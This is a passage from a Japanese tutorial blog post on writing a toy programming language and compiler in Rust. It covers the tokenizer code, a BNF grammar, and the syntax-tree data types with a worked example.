<span id="cb19-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> cur <span class="op">&lt;</span> src<span class="op">.</span>len() <span class="op">{</span></span>
<span id="cb19-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">let</span> <span class="cn">Some</span>(s) <span class="op">=</span> src<span class="op">.</span>get(cur<span class="op">..</span>) <span class="op">{</span></span>
<span id="cb19-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-6" aria-hidden="true" tabindex="-1"></a>            <span class="pp">macro_rules!</span> match_re <span class="op">{</span></span>
<span id="cb19-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-7" aria-hidden="true" tabindex="-1"></a>                (<span class="op">$</span>re<span class="op">:</span>expr<span class="op">,</span> <span class="op">$</span>closure<span class="op">:</span>expr) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb19-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-8" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="kw">let</span> <span class="cn">Some</span>(m) <span class="op">=</span> <span class="op">$</span>re<span class="op">.</span>find(s) <span class="op">{</span></span>
<span id="cb19-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-9" aria-hidden="true" tabindex="-1"></a>                        <span class="op">$</span>closure(m)<span class="op">;</span></span>
<span id="cb19-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-10" aria-hidden="true" tabindex="-1"></a>                        cur <span class="op">+=</span> m<span class="op">.</span>end()<span class="op">;</span></span>
<span id="cb19-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-11" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">continue</span><span class="op">;</span></span>
<span id="cb19-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-12" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
<span id="cb19-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-13" aria-hidden="true" tabindex="-1"></a>                <span class="op">};</span></span>
<span id="cb19-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-14" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb19-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-16" aria-hidden="true" tabindex="-1"></a>            <span class="pp">macro_rules!</span> match_str <span class="op">{</span></span>
<span id="cb19-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-17" aria-hidden="true" tabindex="-1"></a>                (<span class="op">$</span>pat<span class="op">:</span>expr<span class="op">,</span> <span class="op">$</span>e<span class="op">:</span>expr) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb19-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-18" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> s<span class="op">.</span>starts_with(<span class="op">$</span>pat) <span class="op">{</span></span>
<span id="cb19-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-19" aria-hidden="true" tabindex="-1"></a>                        <span class="op">$</span>e<span class="op">;</span></span>
<span id="cb19-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-20" aria-hidden="true" tabindex="-1"></a>                        cur <span class="op">+=</span> <span class="op">$</span>pat<span class="op">.</span>len()<span class="op">;</span></span>
<span id="cb19-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-21" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">continue</span><span class="op">;</span></span>
<span id="cb19-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-22" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
<span id="cb19-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-23" aria-hidden="true" tabindex="-1"></a>                <span class="op">};</span></span>
<span id="cb19-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-24" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb19-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-26" aria-hidden="true" tabindex="-1"></a>            <span class="pp">lazy_static!</span> <span class="op">{</span></span>
<span id="cb19-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-27" aria-hidden="true" tabindex="-1"></a>                <span class="kw">static</span> <span class="kw">ref</span> WHITESPACES<span class="op">:</span> Regex <span class="op">=</span> <span class="pp">Regex::</span>new(<span class="st">r&quot;^\s+&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb19-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-28" aria-hidden="true" tabindex="-1"></a>                <span class="kw">static</span> <span class="kw">ref</span> COMMENT<span class="op">:</span> Regex <span class="op">=</span> <span class="pp">Regex::</span>new(<span class="st">r&quot;^(?m://.+$)&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb19-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-29" aria-hidden="true" tabindex="-1"></a>                <span class="kw">static</span> <span class="kw">ref</span> INTEGER<span class="op">:</span> Regex <span class="op">=</span> <span class="pp">Regex::</span>new(<span class="st">r&quot;^-?\d+\b&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb19-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-30" aria-hidden="true" tabindex="-1"></a>                <span class="kw">static</span> <span class="kw">ref</span> ID_OR_KEY<span class="op">:</span> Regex <span class="op">=</span></span>
<span id="cb19-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-31" aria-hidden="true" tabindex="-1"></a>                    <span class="pp">Regex::</span>new(<span class="st">r&quot;^[a-zA-Z][a-zA-Z0-9_]*|_[a-zA-Z0-9_]+\b&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb19-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-32" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb19-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-34" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_re!</span>(WHITESPACES<span class="op">,</span> <span class="op">|</span>_<span class="op">|</span> <span class="op">{}</span>)<span class="op">;</span></span>
<span id="cb19-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-35" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_re!</span>(COMMENT<span class="op">,</span> <span class="op">|</span>_<span class="op">|</span> <span class="op">{}</span>)<span class="op">;</span></span>
<span id="cb19-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-37" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_re!</span>(INTEGER<span class="op">,</span> <span class="op">|</span>m<span class="op">:</span> <span class="pp">regex::</span>Match<span class="op">|</span> <span class="op">{</span></span>
<span id="cb19-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-38" aria-hidden="true" tabindex="-1"></a>                tokens<span class="op">.</span>push(<span class="pp">Token::</span>Integer(m<span class="op">.</span>as_str()<span class="op">.</span>parse()<span class="op">.</span>unwrap()))<span class="op">;</span></span>
<span id="cb19-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-39" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span>)<span class="op">;</span></span>
<span id="cb19-40"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-41"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-41" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;+=&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>PlusEq))<span class="op">;</span></span>
<span id="cb19-42"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-42" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;-=&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>MinusEq))<span class="op">;</span></span>
<span id="cb19-43"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-43" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;*&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>Star))<span class="op">;</span></span>
<span id="cb19-44"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-44" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;;&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>Semi))<span class="op">;</span></span>
<span id="cb19-45"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-45" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;(&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>ParenOpen))<span class="op">;</span></span>
<span id="cb19-46"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-46" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;)&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>ParenClose))<span class="op">;</span></span>
<span id="cb19-47"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-47" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;{&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>CurlyOpen))<span class="op">;</span></span>
<span id="cb19-48"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-48" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_str!</span>(<span class="st">&quot;}&quot;</span><span class="op">,</span> tokens<span class="op">.</span>push(<span class="pp">Token::</span>CurlyClose))<span class="op">;</span></span>
<span id="cb19-49"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-49" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-50"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-50" aria-hidden="true" tabindex="-1"></a>            <span class="pp">match_re!</span>(ID_OR_KEY<span class="op">,</span> <span class="op">|</span>m<span class="op">:</span> <span class="pp">regex::</span>Match<span class="op">|</span> <span class="op">{</span></span>
<span id="cb19-51"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-51" aria-hidden="true" tabindex="-1"></a>                <span class="kw">let</span> t <span class="op">=</span> <span class="cf">match</span> m<span class="op">.</span>as_str() <span class="op">{</span></span>
<span id="cb19-52"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-52" aria-hidden="true" tabindex="-1"></a>                    <span class="st">&quot;while&quot;</span> <span class="op">=&gt;</span> <span class="pp">Token::</span>While<span class="op">,</span></span>
<span id="cb19-53"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-53" aria-hidden="true" tabindex="-1"></a>                    s <span class="op">=&gt;</span> <span class="pp">Token::</span>Identifier(s<span class="op">.</span>to_string())<span class="op">,</span></span>
<span id="cb19-54"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-54" aria-hidden="true" tabindex="-1"></a>                <span class="op">};</span></span>
<span id="cb19-55"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-55" aria-hidden="true" tabindex="-1"></a>                tokens<span class="op">.</span>push(t)<span class="op">;</span></span>
<span id="cb19-56"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-56" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span>)<span class="op">;</span></span>
<span id="cb19-57"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-57" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-58"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-58" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="cn">Err</span>(<span class="pp">TokenizerError::</span>UnexpectedCharacter <span class="op">{</span></span>
<span id="cb19-59"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-59" aria-hidden="true" tabindex="-1"></a>                character<span class="op">:</span> s<span class="op">.</span>chars()<span class="op">.</span>next()<span class="op">.</span>unwrap()<span class="op">,</span></span>
<span id="cb19-60"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-60" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span>)<span class="op">;</span></span>
<span id="cb19-61"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-61" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb19-62"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-62" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="cn">Err</span>(<span class="pp">TokenizerError::</span>InputError)<span class="op">;</span></span>
<span id="cb19-63"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-63" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb19-64"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-64" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb19-65"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-65" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-66"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-66" aria-hidden="true" tabindex="-1"></a>    <span class="cn">Ok</span>(tokens)</span>
<span id="cb19-67"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-67" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h2 id="構文解析を実装する">構文解析を実装する</h2>
<p>次は、入力がプログラミング言語の文法に従っているかを確認し、その構造を表現する構文木を組み立てる構文解析を実装していきます。</p>
<h3 id="文法を定義する">文法を定義する</h3>
<p>まずは定義したプログラミング言語のもう少し厳密な文法を決めていきます。とりあえず簡単なところからいきましょう。今回定めたプログラミング言語における、<code>ptr += 123;</code> や、<code>while *ptr { ... }</code> などを <code>statement</code> (文) という要素とします。プログラムは複数の文で成り立っているので、このプログラミング言語には「<code>program</code> (プログラム全体) は <code>statements</code> (1つ以上の文) で構成される」というルールがあることになります。これを <a href="https://en.wikipedia.org/wiki/Backus–Naur_form">BNF (Backus–Naur form)</a> 風に記述するとこうなります。</p>
<pre><code>&lt;program&gt; ::= &lt;statements&gt;
&lt;statements&gt; ::= &lt;statements&gt; &lt;statement&gt; | &lt;statement&gt;</code></pre>
<p>こんな感じにプログラムを構成する要素がどのような構文になっているかのルールを列挙していくことで、文法を定義していきます。</p>
<p>ではどんどんいきましょう。<code>statement</code> は <code>ptr += 123</code> などの <code>expression</code> (式) の末尾にセミコロンをつけたもの、<code>{ ... }</code>、<code>while *ptr { ... }</code> のいずれかで構成されるとすれば</p>
<pre><code>&lt;statement&gt; ::= &lt;expression&gt; ';'
              | &lt;block&gt;
              | 'while' &lt;expression&gt; &lt;block&gt;
&lt;block&gt; ::= '{' &lt;statements&gt; '}'</code></pre>
<p><code>rhs</code> (右辺値) を数値、<code>lhs</code> (左辺値) を <code>ptr</code> や <code>*ptr</code> として、<code>expression</code> は</p>
<pre><code>&lt;expression&gt; ::= &lt;lhs&gt; '+=' &lt;rhs&gt;
               | &lt;lhs&gt; '-=' &lt;rhs&gt;
               | &lt;lhs&gt; '(' ')'
               | &lt;lhs&gt;
&lt;lhs&gt; ::= identifier | '*' identifier
&lt;rhs&gt; ::= number</code></pre>
<p>という感じにしました。</p>
<h3 id="構文木のデータ型を定義する">構文木のデータ型を定義する</h3>
<p>続いて、先程定義したプログラミング言語の各要素を表現するデータ型を <a href="https://github.com/Tosainu/chiya/blob/af4d8799e2b61a717d360238be47af56a501c520/src/parser.rs"><code>src/parser.rs</code></a> に定義していきます。例えば <code>&lt;rhs&gt; ::= number</code> なら</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb23-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb23-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Rhs <span class="op">{</span></span>
<span id="cb23-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb23-3" aria-hidden="true" tabindex="-1"></a>    Number(<span class="dt">i32</span>)<span class="op">,</span></span>
<span id="cb23-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>&lt;lhs&gt; ::= identifier | '*' identifier</code> なら</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb24-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb24-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Lhs <span class="op">{</span></span>
<span id="cb24-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Pointer</span>(<span class="dt">String</span>)<span class="op">,</span></span>
<span id="cb24-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb24-4" aria-hidden="true" tabindex="-1"></a>    Dereference(<span class="dt">String</span>)<span class="op">,</span></span>
<span id="cb24-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>という感じです。</p>
<p>残りの要素の型も書いていきます。<code>Statement::Block</code> など、自身のデータ型を持たせたいときにはポインタ型の <a href="https://doc.rust-lang.org/std/boxed/struct.Box.html"><code>Box&lt;T&gt;</code></a> を使います。</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb25-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb25-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Expression <span class="op">{</span></span>
<span id="cb25-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-3" aria-hidden="true" tabindex="-1"></a>    AssignAdd(Lhs<span class="op">,</span> Rhs)<span class="op">,</span></span>
<span id="cb25-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-4" aria-hidden="true" tabindex="-1"></a>    AssignSub(Lhs<span class="op">,</span> Rhs)<span class="op">,</span></span>
<span id="cb25-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-5" aria-hidden="true" tabindex="-1"></a>    FunctionCall(Lhs)<span class="op">,</span></span>
<span id="cb25-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-6" aria-hidden="true" tabindex="-1"></a>    Lhs(Lhs)<span class="op">,</span></span>
<span id="cb25-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb25-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-9" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb25-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-10" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Statement <span class="op">{</span></span>
<span id="cb25-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-11" aria-hidden="true" tabindex="-1"></a>    Expression(Expression)<span class="op">,</span></span>
<span id="cb25-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-12" aria-hidden="true" tabindex="-1"></a>    Block(<span class="dt">Box</span><span class="op">&lt;</span>Block<span class="op">&gt;</span>)<span class="op">,</span></span>
<span id="cb25-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-13" aria-hidden="true" tabindex="-1"></a>    While(Expression<span class="op">,</span> <span class="dt">Box</span><span class="op">&lt;</span>Block<span class="op">&gt;</span>)<span class="op">,</span></span>
<span id="cb25-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb25-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-16" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb25-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-17" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Statements <span class="op">{</span></span>
<span id="cb25-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-18" aria-hidden="true" tabindex="-1"></a>    Statements(<span class="dt">Box</span><span class="op">&lt;</span>Statements<span class="op">&gt;,</span> Statement)<span class="op">,</span></span>
<span id="cb25-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-19" aria-hidden="true" tabindex="-1"></a>    Statement(Statement)<span class="op">,</span></span>
<span id="cb25-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb25-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-22" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb25-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-23" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Block <span class="op">{</span></span>
<span id="cb25-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-24" aria-hidden="true" tabindex="-1"></a>    Statements(Statements)<span class="op">,</span></span>
<span id="cb25-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb25-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-27" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb25-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-28" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Program <span class="op">{</span></span>
<span id="cb25-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-29" aria-hidden="true" tabindex="-1"></a>    Statements(Statements)<span class="op">,</span></span>
<span id="cb25-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb25-30" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>これで <code>Program</code> を根にすれば構文木を表現できます。例えば次のコードの構文木は</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb26-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">65</span><span class="op">;</span></span>
<span id="cb26-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb26-2" aria-hidden="true" tabindex="-1"></a>putchar<span class="op">();</span></span></code></pre></div>
<p><img src="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/g.svg" /></p>
<p>定義したデータ型を使って表現するとこんな感じになります。</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb27-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> tree <span class="op">=</span> <span class="pp">Program::</span>Statements(<span class="pp">Statements::</span>Statements(</span>
<span id="cb27-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">Box</span><span class="pp">::</span>new(<span class="pp">Statements::</span>Statement(<span class="pp">Statement::</span>Expression(</span>
<span id="cb27-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-3" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span>Dereference(<span class="st">&quot;ptr&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">65</span>))<span class="op">,</span></span>
<span id="cb27-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-4" aria-hidden="true" tabindex="-1"></a>    )))<span class="op">,</span></span>
<span id="cb27-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-5" aria-hidden="true" tabindex="-1"></a>    <span class="pp">Statement::</span>Expression(<span class="pp">Expression::</span>FunctionCall(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(</span>
<span id="cb27-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-6" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;putchar&quot;</span><span class="op">.</span>to_owned()<span class="op">,</span></span>
<span id="cb27-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-7" aria-hidden="true" tabindex="-1"></a>    )))<span class="op">,</span></span>
<span id="cb27-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb27-8" aria-hidden="true" tabindex="-1"></a>))<span class="op">;</span></span></code></pre></div>
